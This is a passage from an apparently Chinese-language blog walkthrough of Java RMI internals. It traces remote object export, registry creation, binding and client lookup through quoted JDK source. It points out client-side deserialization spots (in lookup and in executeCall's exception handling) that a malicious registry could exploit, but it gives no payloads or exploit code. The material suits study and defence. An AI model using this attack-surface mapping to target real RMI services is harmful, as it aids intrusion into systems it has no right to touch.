alt="image-20230421211601165"></p><p>这里只有一个赋值操作</p><p>这时ref里存的就是原本在liveRef里的一些信息</p><p><strong>记住这个ref，在之后我们还会用到</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421211651757.png" alt="image-20230421211651757"></p><p>赋值操作结束后，又重新回到了UnicastRemoteObject类的exportObject方法</p><p>上面的这些过程中，LiveRef、TCPEndoPint、TCPTransport是处理网络通信的类。UnicastRef、UnicastServerRef是远程对象的引用对象，是宏观上处理网络请求的类，也是实现RMI调用的核心逻辑的类。UnicastRemoteObject就是远程对象的基础类，它并不直接处理网络请求，而是通过里面的UnicastServerRef处理。</p><p>目前其实就创建了一个UnicastServerRef，它的ref是一个LiveRef，ref里面有一个TCPEndpoint叫ep，ep里面有个TCPTransport叫transport。<br>继续跟进UnicastRemoteObject#exportObject(Remote obj, UnicastServerRef sref)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421212559065.png" alt="image-20230421212559065"></p><p>这里把sref，也就是包含着那一堆信息的内容给了一个UnicastRemoteObject实例的ref属性，其实是它父类的RemoteObject的ref属性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516203422307.png" alt="image-20230516203422307"></p><p>而这个这个实例应该是我们写的继承了UnicastRemoteObject的实现类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516203513142.png" alt="image-20230516203513142"></p><p>接下来调用了UnicastServerRef的exportObject方法，把刚才的这个实例传进去了，</p><pre class="language-java" data-language="java"><code class="language-java">public Remote exportObject(Remote impl, Object data,                           boolean permanent)    throws RemoteException&#123;    Class&lt;?&gt; implClass &#x3D; impl.getClass();    Remote stub;    try &#123;        stub &#x3D; Util.createProxy(implClass, getClientRef(), forceStubUse);    &#125; catch (IllegalArgumentException e) &#123;        throw new ExportException(            &quot;remote object implements illegal remote interface&quot;, e);    &#125;    if (stub instanceof RemoteStub) &#123;        setSkeleton(impl);    &#125;    Target target &#x3D;        new Target(impl, this, stub, ref.getObjID(), permanent);    ref.exportObject(target);    hashToMethod_Map &#x3D; hashToMethod_Maps.get(implClass);    return stub;&#125;</code></pre><p>可以看到在这个类里出现了stub，也就是最后客户端需要的存根</p><p>然后在这里很显然的创建了代理</p><p><code> stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</code></p><p>这里的参数分别是我们最开始定义的远程对象类，UnicastRef实例对象（里面放着那个一堆信息的LiveRef），以及一个判断是否要强制创建stub的boolen对象</p><p>这里通过UnicastServerRef里的getClientRef()方法获取UnicastRef实例对象、</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516205916768.png" alt="image-20230516205916768"></p><p>这里传入的ref其实就是UnicastRef里的ref，因为UnicastRef是UnicastServerRef父类，所以这里的ref和UnicastServerRef里封装的ref其实是同一个</p><p>然后接下来有个判断，判断是否创建存根</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421215857658.png" alt="image-20230421215857658"></p><p>由于forceStubUse和ignoreStubClasses都是假，所以只要<em>stubClassExists</em>(remoteClass)是真就可以直接到createStub里</p><p>但是这里需要判断以我们的远程对象类的类名+_Stub为名字的类是否存在，存在才会成为true，这里我们不满足这个，所以进不了这个if判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421220039206.png" alt="image-20230421220039206"></p><p>然后再往下，创建了一个动态代理。</p><p>这里就是给我们的远程调用类进行代理的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421220257193.png" alt="image-20230421220257193"></p><p>Invocationhandler里把UnicastRef实例对象放进去了</p><p>这里最核心的就是里边的ref，其实是同一个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421221006861.png" alt="image-20230421221006861"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421221030596.png" alt="image-20230421221030596"></p><p>毕竟这个代理对象就是代表远程对象的。</p><blockquote><p>所以远程对象的Stub其实就是个动态代理，那么远程调用方法时就是调它的invoke方法，后续调用到的时候再分析。<br>stub是要传给客户端使用的，客户端通过操作stub的UnicastRef，来调用服务端远程对象的UnicastServerRef，是一个对称关系。</p></blockquote><p>接下来判断这个Stub是否属于RemoteStub，如果是就调用setSkeleton。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421221236863.png" alt="image-20230421221236863"></p><blockquote><p>RemoteStub是jdk里内置的几个通用类，有<br>Activation$ActivationSystemImpl_Stub<br>ActivationGroup_Stub<br>DGCImpl_Stub<br>RMIConnectionImpl_Stub<br>RMIServerImpl_Stub<br>ReferenceWrapper_Stub<br>RegistryImpl_Stub</p></blockquote><p>接下来又创建了一个Target类</p><p><code>Target target = new Target(impl, this, stub, ref.getObjID(), permanent);</code></p><pre class="language-java" data-language="java"><code class="language-java">public Target(Remote impl, Dispatcher disp, Remote stub, ObjID id, boolean permanent)&#123;    &#x2F;&#x2F; 初始化 weakImpl 为一个 WeakRef 对象，它持有传入的 impl 对象，并将其添加到 ObjectTable 的 reapQueue 队列中。    this.weakImpl &#x3D; new WeakRef(impl, ObjectTable.reapQueue);        &#x2F;&#x2F; 将传入的 disp 赋值给实例变量 disp。    this.disp &#x3D; disp;        &#x2F;&#x2F; 将传入的 stub 赋值给实例变量 stub。    this.stub &#x3D; stub;        &#x2F;&#x2F; 将传入的 id 赋值给实例变量 id。    this.id &#x3D; id;        &#x2F;&#x2F; 使用 AccessController 获取当前线程的上下文。    this.acc &#x3D; AccessController.getContext();    &#x2F;&#x2F; 获取当前线程的上下文类加载器。    ClassLoader threadContextLoader &#x3D; Thread.currentThread().getContextClassLoader();        &#x2F;&#x2F; 获取传入的 impl 对象的类加载器。    ClassLoader serverLoader &#x3D; impl.getClass().getClassLoader();        &#x2F;&#x2F; 检查当前线程的上下文类加载器是否是传入的 impl 对象的类加载器的子级。    if (checkLoaderAncestry(threadContextLoader, serverLoader)) &#123;        &#x2F;&#x2F; 如果是，则使用当前线程的上下文类加载器作为上下文类加载器。        this.ccl &#x3D; threadContextLoader;    &#125; else &#123;        &#x2F;&#x2F; 如果不是，则使用传入的 impl 对象的类加载器作为上下文类加载器。        this.ccl &#x3D; serverLoader;    &#125;        &#x2F;&#x2F; 将传入的 permanent 赋值给实例变量 permanent。    this.permanent &#x3D; permanent;        &#x2F;&#x2F; 如果 permanent 为 true，则调用 pinImpl 方法将 impl 对象钉住（防止被 GC 回收）。    if (permanent) &#123;        pinImpl();    &#125;&#125;</code></pre><p>Target可以理解为是一个远程服务实例，一个Target对应一个远程对象。里面保存了远程对象实例、对应的Stub、对应的远程引用对象UnicastServerRef，之前创建的LiveRef的ObjID。实际上Target就是用LiveRef的ObjID代表了这个远程对象，一个远程对象和一个LiveRef是绑定的。<strong>这里就包括了远程调用所需的全部对象了，远程调用就是Stub使用远程引用来调用远程对象上的方法。</strong></p><p>创建完Target后，又调用了LiveRef的exportObject方法</p><p><code>ref.exportObject(target);</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421222508842.png" alt="image-20230421222508842"></p><p>里面又调用了TCPEndPoint的exportObject</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421222607490.png" alt="image-20230421222607490"></p><p>然后又是TCPTransport的exportObject</p><pre class="language-java" data-language="java"><code class="language-java">public void exportObject(Target target) throws RemoteException &#123;            synchronized (this) &#123;            listen();            exportCount++;        &#125;        boolean ok &#x3D; false;        try &#123;            super.exportObject(target);            ok &#x3D; true;        &#125; finally &#123;            if (!ok) &#123;                synchronized (this) &#123;                    decrementExportCount();                &#125;            &#125;        &#125;    &#125;</code></pre><p>listen方法里主要是监听一个端口</p><pre class="language-java" data-language="java"><code class="language-java">private void listen() throws RemoteException &#123;    assert Thread.holdsLock(this); &#x2F;&#x2F; 断言当前线程已经拥有锁，如果不满足会抛出 AssertionError    TCPEndpoint ep &#x3D; getEndpoint(); &#x2F;&#x2F; 获取 TCPEndpoint 对象    int port &#x3D; ep.getPort(); &#x2F;&#x2F; 获取 TCPEndpoint 对象的端口号    if (server &#x3D;&#x3D; null) &#123; &#x2F;&#x2F; 如果 Server 对象为 null        if (tcpLog.isLoggable(Log.BRIEF)) &#123; &#x2F;&#x2F; 如果 TCP 日志记录器支持 brief 日志级别            tcpLog.log(Log.BRIEF,                &quot;(port &quot; + port + &quot;) create server socket&quot;); &#x2F;&#x2F; 记录 brief 日志        &#125;        try &#123;            server &#x3D; ep.newServerSocket(); &#x2F;&#x2F; 创建 ServerSocket 对象            Thread t &#x3D; AccessController.doPrivileged(                new NewThreadAction(new AcceptLoop(server),                                    &quot;TCP Accept-&quot; + port, true)); &#x2F;&#x2F; 创建新线程，启动 AcceptLoop            t.start(); &#x2F;&#x2F; 启动新线程        &#125; catch (java.net.BindException e) &#123; &#x2F;&#x2F; 如果端口已被占用，抛出 ExportException 异常            throw new ExportException(&quot;Port already in use: &quot; + port, e);        &#125; catch (IOException e) &#123; &#x2F;&#x2F; 如果监听失败，抛出 ExportException 异常            throw new ExportException(&quot;Listen failed on port: &quot; + port, e);        &#125;    &#125; else &#123; &#x2F;&#x2F; 如果 Server 对象不为 null        &#x2F;&#x2F; otherwise verify security access to existing server socket        SecurityManager sm &#x3D; System.getSecurityManager(); &#x2F;&#x2F; 获取安全管理器        if (sm !&#x3D; null) &#123; &#x2F;&#x2F; 如果安全管理器不为 null            sm.checkListen(port); &#x2F;&#x2F; 验证监听端口是否被授权访问        &#125;    &#125;&#125;</code></pre><p>首先获取了之前保存的TCPEndpoint和端口，然后调用了TCPEndpoint.newServerSocket，跟进去实际最后就是创建了个普通的ServerSocket。然后创建了一个新的AcceptLoop类的监听线程并开启。然后就是等待客户端的连接了。<br>那么实际上服务就已经发布出去了。最后还有一步记录已经发布的Target，调用了TransPort的exportObject</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421223046834.png" alt="image-20230421223046834"></p><pre class="language-java" data-language="java"><code class="language-java">public void exportObject(Target target) throws RemoteException &#123;    target.setExportedTransport(this);    ObjectTable.putTarget(target);&#125;</code></pre><p>在Target类里的setExportedTransport方法只是个简单的赋值操作，对应的TCPTransport保存进Target</p><pre class="language-java" data-language="java"><code class="language-java">void setExportedTransport(Transport exportedTransport) &#123;    if (this.exportedTransport &#x3D;&#x3D; null) &#123;        this.exportedTransport &#x3D; exportedTransport;    &#125;&#125;</code></pre><p>然后调用ObjectTable类putTarget方法</p><pre class="language-java" data-language="java"><code class="language-java">static void putTarget(Target target) throws ExportException &#123;    ObjectEndpoint oe &#x3D; target.getObjectEndpoint();    WeakRef weakImpl &#x3D; target.getWeakImpl();    if (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;        DGCImpl.dgcLog.log(Log.VERBOSE, &quot;add object &quot; + oe);    &#125;    synchronized (tableLock) &#123;        if (target.getImpl() !&#x3D; null) &#123;            if (objTable.containsKey(oe)) &#123;                throw new ExportException(                    &quot;internal error: ObjID already in use&quot;);            &#125; else if (implTable.containsKey(weakImpl)) &#123;                throw new ExportException(&quot;object already exported&quot;);            &#125;            objTable.put(oe, target);            implTable.put(weakImpl, target);            if (!target.isPermanent()) &#123;                incrementKeepAliveCount();            &#125;        &#125;    &#125;&#125;</code></pre><p>putTarget是把对象和target绑定，放进ObjectTable这个类的静态变量objTable里面。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516211434995.png" alt="image-20230516211434995"></p><p>下面这段代码因为获取了DGCImpl.dgcLog变量，触发了DGCImpl类的实例化。这是垃圾回收相关的类。</p><pre class="language-java" data-language="java"><code class="language-java">if (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;    DGCImpl.dgcLog.log(Log.VERBOSE, &quot;add object &quot; + oe);&#125;</code></pre><p>然后就会调用里面的static代码块</p><pre class="language-java" data-language="java"><code class="language-java">static &#123;     &#x2F;*      * 在与任意当前线程上下文隔离的上下文中“导出”单例的DGCImpl。      *&#x2F;     AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123;         public Void run() &#123;             ClassLoader savedCcl &#x3D; Thread.currentThread().getContextClassLoader();             try &#123;                 &#x2F;&#x2F; 设置上下文类加载器为系统类加载器                 Thread.currentThread().setContextClassLoader(ClassLoader.getSystemClassLoader());                 &#x2F;*                  * 将远程收集器对象手动放入表格中，以防止在端口上侦听。                   * （UnicastServerRef.exportObject将导致传输侦听。）                  *&#x2F;                 try &#123;                     &#x2F;&#x2F; 创建并导出 DGCImpl                     dgc &#x3D; new DGCImpl();                     ObjID dgcID &#x3D; new ObjID(ObjID.DGC_ID);                     LiveRef ref &#x3D; new LiveRef(dgcID, 0);                     UnicastServerRef disp &#x3D; new UnicastServerRef(ref);                     Remote stub &#x3D; Util.createProxy(DGCImpl.class, new UnicastRef(ref), true);                     disp.setSkeleton(dgc);                     &#x2F;&#x2F; 创建一个Target对象，并将其放入ObjectTable中                     Permissions perms &#x3D; new Permissions();                     perms.add(new SocketPermission(&quot;*&quot;, &quot;accept,resolve&quot;));                     ProtectionDomain[] pd &#x3D; &#123; new ProtectionDomain(null, perms) &#125;;                     AccessControlContext acceptAcc &#x3D; new AccessControlContext(pd);                     Target target &#x3D; AccessController.doPrivileged(new PrivilegedAction&lt;Target&gt;() &#123;                         public Target run() &#123;                             return new Target(dgc, disp, stub, dgcID, true);                         &#125;                     &#125;, acceptAcc);                     ObjectTable.putTarget(target);                 &#125; catch (RemoteException e) &#123;                     throw new Error(&quot;exception initializing server-side DGC&quot;, e);                 &#125;             &#125; finally &#123;                 &#x2F;&#x2F; 恢复上下文类加载器                 Thread.currentThread().setContextClassLoader(savedCcl);             &#125;             return null;         &#125;     &#125;); &#125;</code></pre><p>使用单例模式创建了一个DGCImpl对象，这个对象就是RMI的分布式垃圾处理对象，一旦有远程对象被创建，就会实例化这个对象，但也只会创建这一次。后面的代码和UnicastServerRef#exportObject里很像，创建一个代理。但这里和前面不同的是这是一个系统内置类，所以是直接创建了DGCImpl_Stub类，而不是创建的动态代理。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421225004284.png" alt="image-20230421225004284"></p><p>并且设置了disp的skeleton是DGCImpl_Skel。</p><p><code>disp.setSkeleton(dgc);</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421225338717.png" alt="image-20230421225338717"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421225427745.png" alt="image-20230421225427745"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421225849143.png" alt="image-20230421225849143"></p><p>最后同样把这些放进Target，把Target保存进ObjectTable。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421230039784.png" alt="image-20230421230039784"></p><p>然后再把target保存到一个map表里，target里存放着一些信息</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421230520295.png" alt="image-20230421230520295"></p><p>到这里服务发布就结束了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421230631191.png" alt="image-20230421230631191"></p><p>最后在UnicastServerRef类的exportObject里return了一个stub，但代码里并没有接收。</p><p>第一步的创建远程对象的流程如图：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516211919469.png" alt="image-20230516211919469"></p><p>去掉垃圾回收的部分，创建远程对象本身并没有什么可以进行漏洞利用的部分，虽然步骤很繁琐，但实际上这一步基本上都是对ref进行一个又一个的封装。主要就是要把这个远程对象发布出去，然后利用动态代理创建一个stub，让之后的客户端可以通过stub来调用现在服务端发布的远程对象</p><h2 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h2><p>接下来我们来看服务端的第二步</p><p>创建注册中心</p><p><code>Registry registry = LocateRegistry.createRegistry(1099);</code></p><p>首先是调用了LocateRegistry的createRegistry方法，参数就是rmi注册中心的端口1099</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516212912486.png" alt="image-20230516212912486"></p><p>然后在RegistryImpl的构造方法里</p><p>由于不满足这个if判断的后半段</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516213423235.png" alt="image-20230516213423235"></p><p>会进入else里然后创建LiveRef实例，再把这个实例塞进UnicastServerRef里，这里虽然和第一步的时候的参数不太一样，但其实经过一堆super之类的方法，最后调的构造方法都一样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516213358149.png" alt="image-20230516213358149"></p><p>然后就进了setup</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516214311043.png" alt="image-20230516214311043"></p><p>这里边就一个赋值，然后再去调用UnicastServerRef的exportObject方法</p><p>这一幕在创建远程对象里也出现过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230421212559065.png" alt="image-20230421212559065"></p><p>但是这次的参数明显有不同，最主要的就是第一个参数的类不同了，而且第三个参数由false变为了true</p><p>然后我们跟进到它进行动态代理的类里</p><p>在创建远程对象时，这个if判断我们没能进入，主要就是因为stubClassExists里判断我们没能为真</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516215025681.png" alt="image-20230516215025681"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516215218806.png" alt="image-20230516215218806"></p><p>但是现在remoteClass是RegistryImpl类，而RegistryImpl_Stub是存在的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516215251551.png" alt="image-20230516215251551"></p><p>所以现在我们能进入if语句中了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516215307162.png" alt="image-20230516215307162"></p><p>跟进createStub里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516215405776.png" alt="image-20230516215405776"></p><p>这里就是利用反射的方式去实例化RegistryImpl_Stub 类，然后return回来</p><blockquote><p>RegistryImpl_Stub 继承了 RemoteStub ，实现了 Registry。这个类实现了 bind/list/lookup/rebind/unbind 等 Registry 定义的方法，全部是通过序列化和反序列化来实现的。</p></blockquote><p>然后执行完毕后跳出方法回到UnicastServerRef的exportObject方法里继续往下执行</p><p>所以此时的stub就是一个实例化了的RegistryImpl_Stub类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516215913422.png" alt="image-20230516215913422"></p><p>里边套着LiveRef</p><p>因为此时stub就是一个实例化了的RegistryImpl_Stub类，而RegistryImpl_Stub继承了RemoteStub </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516220132513.png" alt="image-20230516220132513"></p><p>所以接下来程序要执行setSkeleton函数了，看这个名字就知道，这个是创建Skeleton的</p><p>根据最开始对rmi的介绍，我们知道在客户端有stub，而在服务端就对应有Skeleton。客户端通过stub请求远程方法，服务端就通过Skeleton去调用方法，然后通过Skeleton获取结果，最后传给客户端Stub，客户端就从Stub获取结果</p><p>跟进setSkeleton</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516220356163.png" alt="image-20230516220356163"></p><p>进到createSkeleton</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516220631789.png" alt="image-20230516220631789"></p><p>通过反射对RegistryImpl_Skel进行实例化，和获取RegistryImpl_Stub的步骤类似</p><p>后边那就和创建和发布远程对象类似了</p><p>先创建个target对象把信息都放一块</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516221007819.png" alt="image-20230516221007819"></p><p>这里因为disp接收的是UnicastServerRef类，而UnicastServerRef的skel在setSkeleton已经被赋值了，所以现在disp的skel属性也有值了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516221441838.png" alt="image-20230516221441838"></p><p>然后就是再进LiveRef的exportObject方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516221656877.png" alt="image-20230516221656877"></p><p>然后一堆调用调到listen</p><p><del>这里也是和第一步不太一样的地方，因为第一步里调TCPEndpoint的getLocalEndpoint方法的时候</del></p><p><del><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516225946779.png" alt="image-20230516225946779"></del></p><p><del>这里得到的epList的值是null，但现在这个不是null，也就进入了else里，给ep赋值了，有了这个transport属性</del></p><p><del><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516225723747.png" alt="image-20230516225723747"></del></p><p><del>（至于为什么会这样我也不知道，跟着调没调出出原因，不过应该不是端口问题，我调试的时候改了端口，在第一步时的结果也是null</del></p><p>我是笨比，这个应该是有个变量在第一次执行的时候被改变了或者是缓存的原因，导致如果不结束idea的调试而是直接重置帧会导致epList不为空</p><h2 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h2><p>注册说白了就是 bind 的过程，通常情况下，如果 Server 端和 Registry 在同一端，我们可以直接调用Registry 的 bind 方法进行绑定，具体实现在 RegistryImpl 的 bind 方法，就是将 Remote 对象和名称 String 放在成员变量 bindings 中，这是一个 Hashtable 对象。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516233203884.png" alt="image-20230516233203884"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230516233015241.png" alt="image-20230516233015241"></p><p>先做个安全检查，然后再判断在hashtable中是否已经有了name这个键，如果没有就把name和object给put进hashtable里</p><h2 id="客户端请求注册中心-客户端"><a href="#客户端请求注册中心-客户端" class="headerlink" title="客户端请求注册中心-客户端"></a>客户端请求注册中心-客户端</h2><p>接下来来分析一下客户端的部分</p><p>首先是请求注册中心<code>Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517133131080.png" alt="image-20230517133131080"></p><p>创建注册中心的时候是createRegistry，那请求的时候很自然就是get了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517133359595.png" alt="image-20230517133359595"></p><p>这里边就先判断端口，不存在就赋值成默认的1099端口，然后</p><p>再判断一下host</p><p>然后又是熟悉的在UnicastRef里套LiveRef</p><p>之后又是调用createProxy创建了一个代理对象，因为这个if成立，所以就直接进入了createStub里，不会去创建动态代理。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517170454130.png" alt="image-20230517170454130"></p><p>然后这一步就结束了。</p><p>里面的主要的过程和之前其实是一样的，就是创建并且返回了一个代理类</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517134714008.png" alt="image-20230517134714008"></p><p>这个代理对象其实就是客户端的stub</p><p>之前我们说在创建远程对象的时候也有个stub，是UnicastServerRef返回回来的，但是代码里并没用去接收它</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517135418451.png" alt="image-20230517135418451"></p><p>这里的stub也是createProxy创建的代理对象，所以其实是一样的东西（准确来说应该不太一样，直接通过createStub创建的是个代理对象，而不走createStub的创建的是个动态代理对象），只不过这里有接收它的东西</p><p>下一步，就是<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;);</code>获取远程对象</p><p>Regsitry_Stub这里是class文件，没源码所以只能静态的跟了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517141114384.png" alt="image-20230517141114384"></p><p>首先是调用UnicastRef的newCall创建一个连接</p><p>接下来重点看<code>var3.writeObject(var1);</code></p><p>它将lookup的参数进行了序列化的操作，这是客户端给注册中心传输的内容，那么如果注册中心想读取这个字符串，就会进行反序列化，<strong>这就有了造成反序列化漏洞的利用点</strong></p><p>再看下面的<code>super.ref.invoke(var2);</code></p><p>这里是调用的Unicastref里的invoke方法</p><p>这个invoke方法是stub里处理网络请求都要用到的方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517141752439.png" alt="image-20230517141752439"></p><p>这里调用了<code>call.executeCall()</code>，call这里就是我们之前利用newCall创建的连接，所以这里就是调用了StreamRemoteCall类的executeCall方法</p><p>这个函数里面有个处理异常的部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517142422573.png" alt="image-20230517142422573"></p><p>可以看到这里也有个反序列化的地方</p><p>执行完invoke后，在lookup里还有一个被攻击的地方</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517142953752.png" alt="image-20230517142953752"></p><p>这里是将注册中心返回的结果进行反序列化，所以假设我们现在有一个恶意的注册中心，就能攻击客户端</p><p>然后我们来整理一下客户端请求注册中心的过程中可利用的攻击客户端的攻击点</p><h3 id="攻击点一"><a href="#攻击点一" class="headerlink" title="攻击点一"></a>攻击点一</h3><p>最明显的一个自然是在lookup里</p><p>将请求注册中心得到的内容进行反序列化的这一步</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517143737001.png" alt="image-20230517143737001"></p><h3 id="攻击点二"><a href="#攻击点二" class="headerlink" title="攻击点二"></a>攻击点二</h3><p>第二个地方是</p><p>lookup里调用Unicastref里的invoke方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517143841604.png" alt="image-20230517143841604"></p><p>然后在invoke里又调用了StreamRemoteCall类的executeCall方法</p><p>在这个方法里先调用getInputStream获得注册中心的返回值</p><p>然后在后面的处理异常的部分，假设是TransportConstants.ExceptionalReturn这个异常，那么就会进行一个反序列化的操作</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517144127504.png" alt="image-20230517144127504"></p><p>攻击点二相比攻击点一利用范围更广泛</p><p>因为攻击点一只有lookup和list方法才有，而攻击点二在lookup、bind、list、rebind、unbind这几个方法里都有</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517144903117.png" alt="image-20230517144903117"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517144930262.png" alt="image-20230517144930262"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517144949919.png" alt="image-20230517144949919"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517145001023.png" alt="image-20230517145001023"></p><h2 id="客户端请求服务端-客户端"><a href="#客户端请求服务端-客户端" class="headerlink" title="客户端请求服务端-客户端"></a>客户端请求服务端-客户端</h2><p>在创建远程对象的时候我们提过</p><p>远程对象的Stub其实就是个动态代理，那么远程调用方法时就是调它的invoke方法，<br>stub是要传给客户端使用的，客户端通过操作stub的UnicastRef，来调用服务端远程对象的UnicastServerRef</p><p><code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;);</code>这行代码就相当于获得远程对象的stub</p><p>接下来<code>String s = remoteObj.sayHello();</code>这一步就是去调用这个远程对象的stub</p><p>所以会先进RemoteObjectInvocationHandler的invoke里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517164112561.png" alt="image-20230517164112561"></p><p>这里有个<code>invokeRemoteMethod(proxy, method, args);</code>，就是负责方法调用的</p><p>在这里面又调用了ref.invoke，这个ref在请求注册中心的第一步里已经赋值了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517172257325.png" alt="image-20230517172257325"></p><p>所以这里相当于调了UnicastRef的invoke方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517171556114.png" alt="image-20230517171556114"></p><p>在这里调用了一个marshalValue方法，是判断参数类型的，但是我们这里没参数，所以连if判断都进不去（</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517172458202.png" alt="image-20230517172458202"></p><p>判断完出来之后调了个call.executeCall();这里和请求注册中心的时候的攻击点一样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517180605842.png" alt="image-20230517180605842"></p><p>然后判断返回值是不是空，不为空的话就把结果放进in里，然后调用unmarshalValue</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230517180745527.png" 